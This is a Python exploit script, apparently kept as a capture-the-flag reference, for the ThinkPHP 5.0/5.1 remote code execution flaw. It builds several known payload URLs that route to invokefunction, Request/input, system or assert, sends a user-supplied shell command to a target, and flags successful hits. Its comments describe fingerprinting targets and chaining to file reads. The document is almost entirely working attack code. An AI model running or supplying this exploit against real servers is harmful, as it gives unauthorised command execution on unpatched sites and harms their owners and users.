#!/usr/bin/env python3
# [REFERENCE] ThinkPHP 5.0/5.1 RCE (CNVD-2018-24942 family) — routing to arbitrary
# class methods. Chinese PHP targets: check ThinkPHP first (X-Powered-By or /favicon
# or error page art).
# Fingerprint: ThinkPHP error page ("ThinkPHP" in HTML error), ?s= or pathinfo
# routing accepted. Affected 5.0.x<5.0.23, 5.1.x<5.1.31 (plus long-tail unpatched).
# Usage: python3 thinkphp5-rce.py http://TARGET 'id'
import requests, sys, urllib.parse, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost"
CMD = sys.argv[2] if len(sys.argv) > 2 else "id"

SHAPES = [
    ("/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=", "tp5-invoke"),
    ("/index.php?s=index/think\\Request/input&filter=system&data=", "tp51-input"),
    ("/index.php?s=index/think\\Container/invokefunction&function=phpinfo&vars[0]=1", "tp5-container-phpinfo"),
    ("/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=", "tp5-assert"),
    ("/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=", "qs-variant"),
]

for path, name in SHAPES:
    for enc in ("raw", "enc"):
        p = path.replace("\\", "%5C") if enc == "enc" else path
        url = BASE + urllib.parse.quote(p, safe="/?&=.-_") + urllib.parse.quote(CMD, safe="")
        try:
            r = requests.get(url, verify=False, timeout=10)
            hit = "uid=" in r.text or "root" in r.text
            print("%s %-22s %-4s -> %s len=%d %s" % ("HIT " if hit else "    ", name, enc, r.status_code, len(r.content), r.text[:160].replace("\n", " ") if hit else ""))
            if hit:
                print("WINNER:", url)
        except Exception as e:
            print("    %-22s %-4s ERR %s" % (name, enc, str(e)[:80]))
# HIT gives direct command exec; chain to flag read with 'cat /flag*' style commands.
# All 404s = patched or wrong framework — rotate.
